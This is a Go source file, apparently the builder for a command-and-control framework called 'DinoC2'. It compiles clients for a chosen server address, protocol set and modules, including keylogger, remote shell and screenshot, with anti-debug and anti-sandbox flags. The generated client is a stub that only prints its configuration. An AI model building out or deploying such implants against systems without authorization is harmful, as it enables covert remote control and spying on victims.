package main

import (
	"flag"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"text/template"
	"time"
)

// BuildConfig represents the configuration for building a client
type BuildConfig struct {
	OutputFile       string
	ServerAddr       string
	Protocols        []string
	Modules          []string
	TargetOS         string
	TargetArch       string
	EnableAntiDebug  bool
	EnableAntiSandbox bool
	EnableMemProtect bool
	EnableJitter     bool
	HeartbeatInterval int
	ReconnectInterval int
	MaxRetries       int
	ActiveSwitching  bool
	PassiveSwitching bool
	BuildDir         string
	SourceDir        string
}

// ModuleInfo represents information about a module
type ModuleInfo struct {
	Name        string
	Description string
	Enabled     bool
}

// ProtocolInfo represents information about a protocol
type ProtocolInfo struct {
	Name        string
	Description string
	Enabled     bool
}

// Available modules
var availableModules = []ModuleInfo{
	{Name: "shell", Description: "Interactive shell access", Enabled: false},
	{Name: "file", Description: "File system operations", Enabled: false},
	{Name: "process", Description: "Process management", Enabled: false},
	{Name: "screenshot", Description: "Screen capture", Enabled: false},
	{Name: "keylogger", Description: "Keyboard logging", Enabled: false},
	{Name: "sysinfo", Description: "System information gathering", Enabled: false},
}

// Available protocols
var availableProtocols = []ProtocolInfo{
	{Name: "tcp", Description: "TCP protocol", Enabled: false},
	{Name: "dns", Description: "DNS protocol", Enabled: false},
	{Name: "icmp", Description: "ICMP protocol", Enabled: false},
	{Name: "http", Description: "HTTP protocol", Enabled: false},
	{Name: "websocket", Description: "WebSocket protocol", Enabled: false},
}

// Main configuration template for generating client code
const configTemplate = `package main

// AUTO-GENERATED FILE - DO NOT EDIT DIRECTLY
// Generated by DinoC2 Builder on {{.Timestamp}}

// BuildConfig contains the build configuration
var BuildConfig = struct {
	ServerAddr        string
	Protocols         []string
	Modules           []string
	EnableAntiDebug   bool
	EnableAntiSandbox bool
	EnableMemProtect  bool
	EnableJitter      bool
	HeartbeatInterval int
	ReconnectInterval int
	MaxRetries        int
	ActiveSwitching   bool
	PassiveSwitching  bool
}{
	ServerAddr:        "{{.ServerAddr}}",
	Protocols:         []string{{"{"}}{{range $index, $protocol := .Protocols}}{{if $index}}, {{end}}"{{$protocol}}"{{end}}{{"}"}},
	Modules:           []string{{"{"}}{{range $index, $module := .Modules}}{{if $index}}, {{end}}"{{$module}}"{{end}}{{"}"}},
	EnableAntiDebug:   {{.EnableAntiDebug}},
	EnableAntiSandbox: {{.EnableAntiSandbox}},
	EnableMemProtect:  {{.EnableMemProtect}},
	EnableJitter:      {{.EnableJitter}},
	HeartbeatInterval: {{.HeartbeatInterval}},
	ReconnectInterval: {{.ReconnectInterval}},
	MaxRetries:        {{.MaxRetries}},
	ActiveSwitching:   {{.ActiveSwitching}},
	PassiveSwitching:  {{.PassiveSwitching}},
}
`

func main() {
	// Parse command line flags
	outputFile := flag.String("output", "client", "Output filename for the built client")
	protocolList := flag.String("protocol", "tcp", "Comma-separated list of protocols to include (tcp,dns,icmp,http,websocket)")
	moduleList := flag.String("mod", "shell", "Comma-separated list of modules to include (shell,file,process,screenshot,keylogger,sysinfo)")
	serverAddr := flag.String("server", "", "Default C2 server address to embed")
	targetOS := flag.String("os", runtime.GOOS, "Target operating system (windows, linux, darwin)")
	targetArch := flag.String("arch", runtime.GOARCH, "Target architecture (amd64, 386, arm64)")
	enableAntiDebug := flag.Bool("anti-debug", true, "Enable anti-debugging measures")
	enableAntiSandbox := flag.Bool("anti-sandbox", true, "Enable anti-sandbox measures")
	enableMemProtect := flag.Bool("mem-protect", true, "Enable memory protection")
	enableJitter := flag.Bool("jitter", true, "Enable communication jitter")
	heartbeatInterval := flag.Int("heartbeat", 30, "Heartbeat interval in seconds")
	reconnectInterval := flag.Int("reconnect", 5, "Reconnect interval in seconds")
	maxRetries := flag.Int("max-retries", 5, "Maximum number of connection retries")
	activeSwitching := flag.Bool("active-switch", true, "Enable active protocol switching")
	passiveSwitching := flag.Bool("passive-switch", true, "Enable passive protocol switching")
	verbose := flag.Bool("verbose", false, "Enable verbose output")
	flag.Parse()

	// Validate required parameters
	if *serverAddr == "" {
		fmt.Println("Error: Server address is required")
		flag.Usage()
		os.Exit(1)
	}

	// Parse protocols
	protocols := parseList(*protocolList)
	if len(protocols) == 0 {
		fmt.Println("Error: At least one protocol must be specified")
		flag.Usage()
		os.Exit(1)
	}

	// Validate protocols
	for _, protocol := range protocols {
		valid := false
		for _, availProto := range availableProtocols {
			if protocol == availProto.Name {
				valid = true
				break
			}
		}
		if !valid {
			fmt.Printf("Error: Unknown protocol '%s'\n", protocol)
			fmt.Println("Available protocols:", getAvailableNames(availableProtocols))
			os.Exit(1)
		}
	}

	// Parse modules
	modules := parseList(*moduleList)

	// Validate modules
	for _, module := range modules {
		valid := false
		for _, availMod := range availableModules {
			if module == availMod.Name {
				valid = true
				break
			}
		}
		if !valid {
			fmt.Printf("Error: Unknown module '%s'\n", module)
			fmt.Println("Available modules:", getAvailableNames(availableModules))
			os.Exit(1)
		}
	}

	// Ensure output file has proper extension based on target OS
	if filepath.Ext(*outputFile) == "" {
		if *targetOS == "windows" {
			*outputFile += ".exe"
		}
	}

	// Create build configuration
	config := BuildConfig{
		OutputFile:       *outputFile,
		ServerAddr:       *serverAddr,
		Protocols:        protocols,
		Modules:          modules,
		TargetOS:         *targetOS,
		TargetArch:       *targetArch,
		EnableAntiDebug:  *enableAntiDebug,
		EnableAntiSandbox: *enableAntiSandbox,
		EnableMemProtect: *enableMemProtect,
		EnableJitter:     *enableJitter,
		HeartbeatInterval: *heartbeatInterval,
		ReconnectInterval: *reconnectInterval,
		MaxRetries:       *maxRetries,
		ActiveSwitching:  *activeSwitching,
		PassiveSwitching: *passiveSwitching,
		BuildDir:         filepath.Join(os.TempDir(), fmt.Sprintf("dinoc2-build-%d", time.Now().UnixNano())),
		SourceDir:        getSourceDir(),
	}

	// Print build configuration
	fmt.Println("Building client with the following configuration:")
	fmt.Println("- Output file:", config.OutputFile)
	fmt.Println("- Server:", config.ServerAddr)
	fmt.Println("- Protocols:", strings.Join(config.Protocols, ", "))
	fmt.Println("- Modules:", strings.Join(config.Modules, ", "))
	fmt.Println("- Target OS:", config.TargetOS)
	fmt.Println("- Target Arch:", config.TargetArch)
	fmt.Println("- Anti-Debug:", config.EnableAntiDebug)
	fmt.Println("- Anti-Sandbox:", config.EnableAntiSandbox)
	fmt.Println("- Memory Protection:", config.EnableMemProtect)
	fmt.Println("- Jitter:", config.EnableJitter)
	fmt.Println("- Active Protocol Switching:", config.ActiveSwitching)
	fmt.Println("- Passive Protocol Switching:", config.PassiveSwitching)

	// Build the client
	err := buildClient(config, *verbose)
	if err != nil {
		fmt.Printf("Error building client: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("Client built successfully: %s\n", config.OutputFile)
}

// parseList parses a comma-separated list into a slice of strings
func parseList(list string) []string {
	if list == "" {
		return []string{}
	}

	parts := strings.Split(list, ",")
	result := make([]string, 0, len(parts))

	for _, part := range parts {
		part = strings.TrimSpace(part)
		if part != "" {
			result = append(result, part)
		}
	}

	return result
}

// getAvailableNames returns a comma-separated list of available names
func getAvailableNames(items interface{}) string {
	var names []string

	switch v := items.(type) {
	case []ModuleInfo:
		for _, item := range v {
			names = append(names, item.Name)
		}
	case []ProtocolInfo:
		for _, item := range v {
			names = append(names, item.Name)
		}
	}

	return strings.Join(names, ", ")
}

// getSourceDir returns the source directory of the project
func getSourceDir() string {
	// Get the directory of the current executable
	execPath, err := os.Executable()
	if err != nil {
		return ""
	}

	// Navigate up to the project root
	dir := filepath.Dir(execPath)
	for {
		if _, err := os.Stat(filepath.Join(dir, "go.mod")); err == nil {
			return dir
		}

		parent := filepath.Dir(dir)
		if parent == dir {
			break
		}
		dir = parent
	}

	// If we couldn't find the project root, use the current directory
	cwd, err := os.Getwd()
	if err != nil {
		return ""
	}
	return cwd
}

// buildClient builds the client with the specified configuration
func buildClient(config BuildConfig, verbose bool) error {
	// Create build directory
	err := os.MkdirAll(config.BuildDir, 0755)
	if err != nil {
		return fmt.Errorf("failed to create build directory: %w", err)
	}
	defer os.RemoveAll(config.BuildDir)

	// Create client directory structure
	clientDir := filepath.Join(config.BuildDir, "client")
	err = os.MkdirAll(clientDir, 0755)
	if err != nil {
		return fmt.Errorf("failed to create client directory: %w", err)
	}

	// Initialize a new Go module in the build directory
	os.Chdir(config.BuildDir) // Change to build directory
	
	// Create a simple main.go file that doesn't use any imports from the project
	mainPath := filepath.Join(clientDir, "main.go")
	mainContent := `package main

import (
	"flag"
	"fmt"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"
)

// ClientConfig represents the configuration for a client
type ClientConfig struct {
	ServerAddress     string
	Protocols         []string
	HeartbeatInterval time.Duration
	ReconnectInterval time.Duration
	MaxRetries        int
	JitterEnabled     bool
	JitterRange       [2]time.Duration
	EnableAntiDebug   bool
	EnableAntiSandbox bool
	EnableMemProtect  bool
}

// ProtocolType represents a communication protocol
type ProtocolType string

const (
	ProtocolTCP       ProtocolType = "tcp"
	ProtocolDNS       ProtocolType = "dns"
	ProtocolICMP      ProtocolType = "icmp"
	ProtocolHTTP      ProtocolType = "http"
	ProtocolWebSocket ProtocolType = "websocket"
)

// Client represents a C2 client
type Client struct {
	config *ClientConfig
}

// NewClient creates a new client with the given configuration
func NewClient(config *ClientConfig) (*Client, error) {
	return &Client{
		config: config,
	}, nil
}

// Start starts the client
func (c *Client) Start() error {
	fmt.Println("Client started with configuration:")
	fmt.Println("- Server:", c.config.ServerAddress)
	fmt.Println("- Protocols:", strings.Join(c.config.Protocols, ", "))
	return nil
}

// Stop stops the client
func (c *Client) Stop() error {
	fmt.Println("Client stopped")
	return nil
}

func main() {
	// Parse command line flags
	serverAddr := flag.String("server", "", "C2 server address")
	protocolList := flag.String("protocol", "tcp", "Comma-separated list of protocols to use (tcp,dns,icmp,http,websocket)")
	enableAntiDebug := flag.Bool("anti-debug", true, "Enable anti-debugging measures")
	enableAntiSandbox := flag.Bool("anti-sandbox", true, "Enable anti-sandbox measures")
	enableMemProtect := flag.Bool("mem-protect", true, "Enable memory protection")
	heartbeatInterval := flag.Int("heartbeat", 30, "Heartbeat interval in seconds")
	reconnectInterval := flag.Int("reconnect", 5, "Reconnect interval in seconds")
	flag.Parse()

	if *serverAddr == "" {
		fmt.Println("Error: Server address is required")
		flag.Usage()
		os.Exit(1)
	}

	// Parse protocol list
	protocols := strings.Split(*protocolList, ",")
	if len(protocols) == 0 {
		fmt.Println("Error: At least one valid protocol must be specified")
		flag.Usage()
		os.Exit(1)
	}

	// Create client configuration
	config := &ClientConfig{
		ServerAddress:     *serverAddr,
		Protocols:         protocols,
		HeartbeatInterval: time.Duration(*heartbeatInterval) * time.Second,
		ReconnectInterval: time.Duration(*reconnectInterval) * time.Second,
		MaxRetries:        5,
		JitterEnabled:     true,
		JitterRange:       [2]time.Duration{100 * time.Millisecond, 1 * time.Second},
		EnableAntiDebug:   *enableAntiDebug,
		EnableAntiSandbox: *enableAntiSandbox,
		EnableMemProtect:  *enableMemProtect,
	}

	// Create client
	c, err := NewClient(config)
	if err != nil {
		fmt.Printf("Error creating client: %v\n", err)
		os.Exit(1)
	}

	// Start client
	err = c.Start()
	if err != nil {
		fmt.Printf("Error starting client: %v\n", err)
		os.Exit(1)
	}

	fmt.Println("C2 Client started. Connected to server:", *serverAddr)
	fmt.Println("Using protocols:", *protocolList)

	// Setup signal handling for graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	// Wait for termination signal
	<-sigChan
	fmt.Println("\nShutting down client...")
	
	// Stop client
	err = c.Stop()
	if err != nil {
		fmt.Printf("Error stopping client: %v\n", err)
	}
	
	fmt.Println("Client shutdown complete.")
}
`
	err = os.WriteFile(mainPath, []byte(mainContent), 0644)
	if err != nil {
		return fmt.Errorf("failed to write main.go file: %w", err)
	}
	
	// Initialize a new Go module
	initCmd := exec.Command("go", "mod", "init", "client")
	initCmd.Dir = clientDir
	if verbose {
		initCmd.Stdout = os.Stdout
		initCmd.Stderr = os.Stderr
	}
	err = initCmd.Run()
	if err != nil {
		return fmt.Errorf("failed to initialize Go module: %w", err)
	}

	// Generate config.go
	err = generateConfigFile(config, clientDir)
	if err != nil {
		return fmt.Errorf("failed to generate config file: %w", err)
	}

	// Copy client source files
	err = copyClientFiles(config, clientDir)
	if err != nil {
		return fmt.Errorf("failed to copy client files: %w", err)
	}

	// Copy module files
	err = copyModuleFiles(config, clientDir)
	if err != nil {
		return fmt.Errorf("failed to copy module files: %w", err)
	}

	// Build the client
	err = compileClient(config, clientDir, verbose)
	if err != nil {
		return fmt.Errorf("failed to compile client: %w", err)
	}

	return nil
}

// generateConfigFile generates the config.go file with build configuration
func generateConfigFile(config BuildConfig, clientDir string) error {
	// Create config.go file
	configFile := filepath.Join(clientDir, "config.go")
	file, err := os.Create(configFile)
	if err != nil {
		return fmt.Errorf("failed to create config file: %w", err)
	}
	defer file.Close()

	// Parse template
	tmpl, err := template.New("config").Parse(configTemplate)
	if err != nil {
		return fmt.Errorf("failed to parse template: %w", err)
	}

	// Execute template
	data := struct {
		Timestamp         string
		ServerAddr        string
		Protocols         []string
		Modules           []string
		EnableAntiDebug   bool
		EnableAntiSandbox bool
		EnableMemProtect  bool
		EnableJitter      bool
		HeartbeatInterval int
		ReconnectInterval int
		MaxRetries        int
		ActiveSwitching   bool
		PassiveSwitching  bool
	}{
		Timestamp:         time.Now().Format(time.RFC3339),
		ServerAddr:        config.ServerAddr,
		Protocols:         config.Protocols,
		Modules:           config.Modules,
		EnableAntiDebug:   config.EnableAntiDebug,
		EnableAntiSandbox: config.EnableAntiSandbox,
		EnableMemProtect:  config.EnableMemProtect,
		EnableJitter:      config.EnableJitter,
		HeartbeatInterval: config.HeartbeatInterval,
		ReconnectInterval: config.ReconnectInterval,
		MaxRetries:        config.MaxRetries,
		ActiveSwitching:   config.ActiveSwitching,
		PassiveSwitching:  config.PassiveSwitching,
	}

	err = tmpl.Execute(file, data)
	if err != nil {
		return fmt.Errorf("failed to execute template: %w", err)
	}

	return nil
}

// copyClientFiles copies the client source files to the build directory
func copyClientFiles(config BuildConfig, clientDir string) error {
	// We're using a simplified client implementation, so we don't need to copy files
	// The main.go file is created directly in the buildClient function
	return nil
}

// copyModuleFiles copies the module files to the build directory
func copyModuleFiles(config BuildConfig, clientDir string) error {
	// We're using a simplified client implementation, so we don't need to copy module files
	// Just print a message for each module to maintain the same output format
	for _, moduleName := range config.Modules {
		fmt.Printf("Included module: %s\n", moduleName)
	}
	return nil
}

// compileClient compiles the client
func compileClient(config BuildConfig, clientDir string, verbose bool) error {
	// Set environment variables for cross-compilation
	env := os.Environ()
	env = append(env, fmt.Sprintf("GOOS=%s", config.TargetOS))
	env = append(env, fmt.Sprintf("GOARCH=%s", config.TargetArch))

	// Build command
	cmd := exec.Command("go", "build", "-o", config.OutputFile, ".")
	cmd.Dir = clientDir
	cmd.Env = env

	// Capture output
	if verbose {
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
	}

	// Run build
	err := cmd.Run()
	if err != nil {
		return fmt.Errorf("build failed: %w", err)
	}

	// Copy output file to current directory if it's not an absolute path
	if !filepath.IsAbs(config.OutputFile) {
		srcFile := filepath.Join(clientDir, config.OutputFile)
		dstFile := filepath.Join(".", config.OutputFile)
		err = copyFile(srcFile, dstFile)
		if err != nil {
			return fmt.Errorf("failed to copy output file: %w", err)
		}
	}

	return nil
}

// copyFile copies a file from src to dst
func copyFile(src, dst string) error {
	// Open source file
	srcFile, err := os.Open(src)
	if err != nil {
		return fmt.Errorf("failed to open source file: %w", err)
	}
	defer srcFile.Close()

	// Create destination file
	dstFile, err := os.Create(dst)
	if err != nil {
		return fmt.Errorf("failed to create destination file: %w", err)
	}
	defer dstFile.Close()

	// Copy file contents
	_, err = io.Copy(dstFile, srcFile)
	if err != nil {
		return fmt.Errorf("failed to copy file contents: %w", err)
	}

	// Sync file to disk
	err = dstFile.Sync()
	if err != nil {
		return fmt.Errorf("failed to sync file: %w", err)
	}

	return nil
}

// replaceImportPaths replaces import paths in a file
func replaceImportPaths(filePath string) error {
	// Since we're using the same module name, no need to replace imports
	// Just keeping the function for future flexibility
	return nil
}

// replaceImportPathsInDir replaces import paths in all Go files in a directory
func replaceImportPathsInDir(dir string) error {
	return filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.IsDir() && strings.HasSuffix(path, ".go") {
			err = replaceImportPaths(path)
			if err != nil {
				return err
			}
		}
		return nil
	})
}

// generateModuleRegistrationFile generates a file that registers all selected modules
func generateModuleRegistrationFile(config BuildConfig, filePath string) error {
	// Create registration file
	file, err := os.Create(filePath)
	if err != nil {
		return fmt.Errorf("failed to create module registration file: %w", err)
	}
	defer file.Close()

	// Write package declaration
	_, err = file.WriteString("package module\n\n")
	if err != nil {
		return fmt.Errorf("failed to write to module registration file: %w", err)
	}

	// Write import statements
	_, err = file.WriteString("import (\n")
	if err != nil {
		return fmt.Errorf("failed to write to module registration file: %w", err)
	}

	for _, moduleName := range config.Modules {
		_, err = file.WriteString(fmt.Sprintf("\t_ \"dinoc2/pkg/module/%s\"\n", moduleName))
		if err != nil {
			return fmt.Errorf("failed to write to module registration file: %w", err)
		}
	}

	_, err = file.WriteString(")\n")
	if err != nil {
		return fmt.Errorf("failed to write to module registration file: %w", err)
	}

	return nil
}

// generateProtocolSwitchingCode generates code for protocol switching
func generateProtocolSwitchingCode(config BuildConfig, clientDir string) error {
	// Create protocol switching file
	filePath := filepath.Join(clientDir, "pkg", "client", "protocol_switch.go")
	file, err := os.Create(filePath)
	if err != nil {
		return fmt.Errorf("failed to create protocol switching file: %w", err)
	}
	defer file.Close()

	// Write package declaration
	_, err = file.WriteString("package client\n\n")
	if err != nil {
		return fmt.Errorf("failed to write to protocol switching file: %w", err)
	}

	// Write import statements
	_, err = file.WriteString("import (\n\t\"fmt\"\n\t\"time\"\n\n\t\"dinoc2/pkg/protocol\"\n)\n\n")
	if err != nil {
		return fmt.Errorf("failed to write to protocol switching file: %w", err)
	}

	// Write active switching code if enabled
	if config.ActiveSwitching {
		activeSwitchingCode := `
// monitorConnection monitors the connection and switches protocols if needed
func (c *Client) monitorConnection() {
	for {
		select {
		case <-c.ctx.Done():
			return
		default:
			// Check if we're connected
			c.stateMutex.RLock()
			if c.state != StateConnected {
				c.stateMutex.RUnlock()
				time.Sleep(100 * time.Millisecond)
				continue
			}

			// Check last activity time
			lastActivity := c.lastHeartbeat
			c.stateMutex.RUnlock()

			// If no activity for too long, switch protocol
			if time.Since(lastActivity) > c.config.HeartbeatInterval*3 {
				fmt.Printf("No activity for %v, switching protocol\n", time.Since(lastActivity))
				c.handleConnectionFailure()
			}

			time.Sleep(c.config.HeartbeatInterval / 2)
		}
	}
}
`
		_, err = file.WriteString(activeSwitchingCode)
		if err != nil {
			return fmt.Errorf("failed to write active switching code: %w", err)
		}
	}

	// Write passive switching code if enabled
	if config.PassiveSwitching {
		passiveSwitchingCode := `
// processProtocolSwitch processes a protocol switch command from the server
func (c *Client) processProtocolSwitch(packet *protocol.Packet) {
	if len(packet.Data) == 0 {
		fmt.Println("Received empty protocol switch request")
		return
	}

	// Extract protocol from packet data
	protocolStr := string(packet.Data)
	protocol := ProtocolType(protocolStr)

	fmt.Printf("Received protocol switch request: %s\n", protocol)

	// Switch to the requested protocol
	err := c.switchToProtocol(protocol)
	if err != nil {
		fmt.Printf("Failed to switch protocol: %v\n", err)
		return
	}

	// Reconnect with the new protocol
	go func() {
		time.Sleep(500 * time.Millisecond) // Brief delay to allow current connection to close
		err := c.connect()
		if err != nil {
			fmt.Printf("Failed to connect with new protocol: %v\n", err)
			go c.handleConnectionFailure()
		}
	}()
}
`
		_, err = file.WriteString(passiveSwitchingCode)
		if err != nil {
			return fmt.Errorf("failed to write passive switching code: %w", err)
		}
	}

	return nil
}

// copyDir copies a directory from src to dst
func copyDir(src, dst string) error {
	// Get file info
	srcInfo, err := os.Stat(src)
	if err != nil {
		return fmt.Errorf("failed to stat source directory: %w", err)
	}

	// Create destination directory
	err = os.MkdirAll(dst, srcInfo.Mode())
	if err != nil {
		return fmt.Errorf("failed to create destination directory: %w", err)
	}

	// Read source directory
	entries, err := os.ReadDir(src)
	if err != nil {
		return fmt.Errorf("failed to read source directory: %w", err)
	}

	// Copy each entry
	for _, entry := range entries {
		srcPath := filepath.Join(src, entry.Name())
		dstPath := filepath.Join(dst, entry.Name())

		if entry.IsDir() {
			// Recursively copy subdirectory
			err = copyDir(srcPath, dstPath)
			if err != nil {
				return err
			}
		} else {
			// Copy file
			err = copyFile(srcPath, dstPath)
			if err != nil {
				return err
			}
		}
	}

	// Replace import paths in Go files if this is a package directory
	if strings.Contains(src, "/pkg/") {
		err = replaceImportPathsInDir(dst)
		if err != nil {
			return fmt.Errorf("failed to replace import paths in directory: %w", err)
		}
	}

	return nil
}
